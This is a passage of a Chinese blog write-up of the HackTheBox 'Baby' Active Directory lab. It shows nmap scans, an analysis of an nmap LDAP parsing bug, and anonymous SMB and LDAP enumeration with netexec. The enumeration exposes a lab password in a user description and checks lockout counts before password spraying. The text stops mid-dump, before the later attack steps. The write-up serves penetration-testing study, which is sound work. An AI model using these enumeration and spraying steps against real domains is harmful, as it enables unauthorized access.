---
title: HackTheBox Baby：匿名 LDAP 枚举、密码喷洒与 SeBackupPrivilege 提权
date: 2026-06-12
tags: HTB, AD
---

# HackTheBox Baby：匿名 LDAP 枚举、密码喷洒与 SeBackupPrivilege 提权

![[file-20260603115520572.png]]

## 一、信息搜集

### 1、TCP 全端口扫描

```bash
$ sudo nmap -sS -p- 10.129.234.71 -T4 --min-rate 5000 -oA tcp_ports -Pn -n
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 02:55 EDT
Nmap scan report for 10.129.234.71
Host is up (0.026s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
50682/tcp open  unknown
58702/tcp open  unknown
58703/tcp open  unknown
61940/tcp open  unknown
61953/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.59 seconds
```

根据上述 TCP 端口的开放以及它们对应的服务指纹，基本可以确认，目标是 AD 中的 DC（域控）。

对开放端口进行进一步的详细扫描。

先提取端口：

```bash
$ cat tcp_ports.nmap | grep -oP '^\d+' | paste -s -d ','
53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,50682,58702,58703,61940,61953
```

扫描：

```bash
$ sudo nmap -sV -sC 10.129.234.71 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,50682,58702,58703,61940,61953 -oA tcp_ports_detail -Pn -n
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 03:04 EDT
Nmap scan report for 10.129.234.71
Host is up (0.0077s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-03 07:04:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-06-02T06:50:01
|_Not valid after:  2026-12-02T06:50:01
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-03T07:05:27+00:00
|_ssl-date: 2026-06-03T07:06:06+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50682/tcp open  msrpc         Microsoft Windows RPC
58702/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58703/tcp open  msrpc         Microsoft Windows RPC
61940/tcp open  msrpc         Microsoft Windows RPC
61953/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-03T07:05:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.41 seconds
```

从扫描结果中能看到两个域名：

- baby.vl0.（源于 389、3268）
- baby.vl（源于对 3389 的脚本扫描结果）

但这**并不是**真的代表有两个域，真正的域名只有一个，baby.vl。

至于出现“baby.vl0.”，这是 nmap 的一个已知 Bug，在 nmap 的 github 仓库的 issues 界面，搜索：

```
LDAP trailing 0
```

就可以找到这个 BUG：

![[file-20260603152251321.png]]

核心问题：正则表达式的贪婪匹配。

直接通过 nmap 源码理解这个 BUG 可能有点抽象，我将采取抓流量的方式来直观理解这一过程。

首先，打开 wireshark 并且选择监听 Tun 0 的流量。接着对 LDAP 端口进行针对性的扫描：

```bash
$sudo nmap -sV -p 389 -Pn -n 10.129.234.71
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 15:08 CST
Nmap scan report for 10.129.234.71
Host is up (0.39s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

此时回到 wireshark 就能看到具体的交互细节。

`-sV` 模式本质上用的是 `-sT` 的方式去探测端口的存活性，于是先看到的是 TCP 三次握手中的第一个握手包，在收到目标发来的第二次握手包的时候，足以判断目标该端口的开放性，因此 nmap 直接发送了 RST Flag 以结束建立连接。

![[file-20260603153912276.png]]

端口确认存活之后，就是建立真正的 TCP 连接，即完成三次握手：

![[file-20260603154726852.png]]

随后，为了获取服务的详细指纹，nmap 进行了 LDAP 中的 search 操作：

![[file-20260603155152710.png]]

search 的三个关键：

- base：空，代表根 DSE
- scope：base
- filter：`(objectClass=*)`

也就是只查询根 DSE 这一个条目，并且匹配条件是存在/看得到 objectClass 这个属性。

> 根 DSE 的唯一作用是向客户端暴露服务器自身的能力和配置信息，从中能得到域名等信息。

目标根据请求，进行 search 操作，并返回结果：

![[file-20260603161238602.png]]

可以看到一个 LDAP 数据包中“塞着”两个 LDAP 消息：一个是 searchResEntry，另一个是 searchResDone，前者用于装返回的 Entry，后者表示 LDAP 的操作结果（不装数据）。

聚焦，searchResEntry：

![[file-20260603161549108.png]]

可以看到共返回了 22 个属性，聚焦 namp 的正则表达式截取的部分：

![[file-20260603163005535.png]]

域名通过 DN 中的 DC 字段得到：

```
DC=baby,DC=vl
```

得到的域名为：

```
baby.vl
```

那么为什么 namp 会得到：

```
baby.vl0.
```

这个结果呢？

从 nmap 的源码中可以找到对应的正则表达式：

```
match ldap m|^0\x84\0\0..\x02\x01.*dsServiceName1\x84\0\0\0.\x04.CN=NTDS\x20Settings,CN=([^,]+),CN=Servers,CN=([^,]+),CN=Sites,CN=Configuration,DC=([^,]+),DC=([^,]+)0\x84\0|s p/Microsoft Windows Active Directory LDAP/ i/Domain: $3.$4, Site: $2/ o/Windows/ h/$1/ cpe:/o:microsoft:windows/a
```

关键在于 `$4` 捕获组，其对应的正则表达式为：

```
DC=([^,]+)0\x84\0|s
```

`[^,]+` 属于贪婪匹配，会尽可能地搜索“非 `,`”的字符，这就导致最终匹配的结果在：

![[file-20260603194329632.png]]

这意味着，捕获到的内容是一大串的信息，但是由于空字符（`\x00`）的截断，因此我们才看到：

```
baby.vl0.（其实后面还有一大串，只是被 \x00 截断了）
```

> `\x84` 虽然不是一个有效的 ASCII 字符（超过 127 了），但是 nmap 中把它解释成点 `.`。

回到正题，之前的 nmap 输出还没完全分析完：

- 目标的主机名：BabyDC.baby.vl
- smb2-security-mode 脚本的扫描结果为：Message signing enabled and required。这说明我们无法使用 SMB relay

将看到的两个域名都添加到本地域名解析文件（`/etc/hosts`）中：

```
10.129.234.71 BabyDC.baby.vl baby.vl
```

### 2、匿名枚举

445 开放，首先尝试 SMB NULL Session 共享枚举：

```bash
$netexec smb 10.129.234.71 -u '' -p '' --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\:
SMB         10.129.234.71   445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

STATUS_ACCESS_DENIED，无法通过匿名方式访问。

尝试 guest 账户 + 空密码去枚举共享：

```bash
$netexec smb 10.129.234.71 -u guest -p '' --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED
```

依旧失败，这次的提示是 STATUS_ACCOUNT_DISABLED，官方对该状态码的描述是：

```
The referenced account is currently disabled and cannot be logged on to.
```

即该账号确实存在，但是禁止被使用中。

尝试 LDAP 匿名 bind，去枚举合法用户。

> 有了上面“对 nmap 针对 LDAP 嗅探”的底层挖掘之后，我们应该知道 LDAP 是允许匿名 bind 的。

```bash
$netexec ldap 10.129.234.71 -u '' -p '' --users
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                     
LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 23:11:03 0                                          
LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 23:11:03 0                                          
LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 23:11:03 0                                          
LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 23:11:03 0                                          
LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 23:11:08 0                                          
LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 23:11:08 0                                          
LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 23:11:08 0                                          
LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 23:14:37 0        Set initial password to BabyStart123!
```

不仅带出来了部分合法用户，还带出一个关键信息（位于 Teresa.Bell 的 Description 当中）：

```
Set initial password to BabyStart123!
```

用户的初始密码为 BabyStart123!

> 注意“!”也是密码的一部分。

但是，域内用户定期就会强制要求更改密码，因此这个初始密码不一定奏效，但是值得尝试。

在密码喷洒之前，先尝试枚举密码策略：

```bash
 $netexec ldap 10.129.234.71 -u '' -p '' --pass-pol
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [-] No domain password policy found!
```

提示没找到，这并不意味着没有密码策略，只是匿名用户没有权限枚举到密码策略。

尝试通过构造原始 LDAP 查询，来查找用户登入失败次数：

```bash
$netexec ldap 10.129.234.71 -u '' -p '' --base-dn 'dc=baby,dc=vl' --query '(objectClass=*)' 'sAMAccountName badPwdCount'
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Guest
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Computers
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Cert Publishers
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Users
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Guests
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Group Policy Creator Owners
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       RAS and IAS Servers
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Allowed RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Denied RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Enterprise Read-only Domain Controllers
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Cloneable Domain Controllers
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Protected Users
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       DnsAdmins
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       DnsUpdateProxy
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       dev
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Jacqueline.Barnett
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Ashley.Webb
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Hugh.George
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Leonard.Dyer
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       it
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Connor.Wilkinson
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Joseph.Hughes
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Kerry.Wilson
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Teresa.Bell
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

通过输出可以发现，之前看到的合法用户目前登入失败的次数都是 0 ，这意味着：虽然没看到密码策略，但是我们至少可以进行一次尝试，而且刚好目前的密码仅有一个。

但是此次输出的信息，**远不止这些**。

除了之前枚举出来的合法用户，我们还能观察到很多其他的条目（`[+] ……`）。但这些条目并没有显示出我们指定的属性信息，有两个原因：

- 没有该属性
- 没有权限读取该条目的属性

个人偏向于后者，因为我们现在处于匿名枚举的状态，权限有限制。但是到底是什么情况，还得额外验证一下。

将限制放宽，捕获所有的属性：

```bash
$netexec ldap 10.129.234.71 -u '' -p '' --base-dn 'dc=baby,dc=vl' --query '(objectClass=*)' ''
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Guest
LDAP        10.129.234.71   389    BABYDC           description          Built-in account for guest access to the computer/domain
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Guest,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121144952.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121144952.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           8197
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Guests,CN=Builtin,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           8197
LDAP        10.129.234.71   389    BABYDC           name                 Guest
LDAP        10.129.234.71   389    BABYDC           objectGUID           f174e124-e6b5-e044-b151-f2192f705df4
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66082
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           0
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       514
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-501
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Guest
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Domain Computers
LDAP        10.129.234.71   389    BABYDC           description          All workstations and servers joined to the domain
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12330
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12332
LDAP        10.129.234.71   389    BABYDC           name                 Domain Computers
LDAP        10.129.234.71   389    BABYDC           objectGUID           f2a28fe9-fd8e-6044-831a-8e32bc266126
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-515
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Computers
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Cert Publishers
LDAP        10.129.234.71   389    BABYDC           description          Members of this group are permitted to publish certificates to the directory
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12342
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12344
LDAP        10.129.234.71   389    BABYDC           name                 Cert Publishers
LDAP        10.129.234.71   389    BABYDC           objectGUID           c76f0c13-98d2-2745-b85f-19cb164f1c19
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-517
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Cert Publishers
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       536870912
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483644
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Domain Users
LDAP        10.129.234.71   389    BABYDC           description          All domain users
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12348
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Users,CN=Builtin,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12350
LDAP        10.129.234.71   389    BABYDC           name                 Domain Users
LDAP        10.129.234.71   389    BABYDC           objectGUID           cab4d850-106d-9e4c-91ab-39be011a5b9e
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-513
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Users
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Domain Guests
LDAP        10.129.234.71   389    BABYDC           description          All domain guests
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12351
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Guests,CN=Builtin,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12353
LDAP        10.129.234.71   389    BABYDC           name                 Domain Guests
LDAP        10.129.234.71   389    BABYDC           objectGUID           edff1026-8342-a246-bae7-9bcc489d99c3
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-514
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Domain Guests
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Group Policy Creator Owners
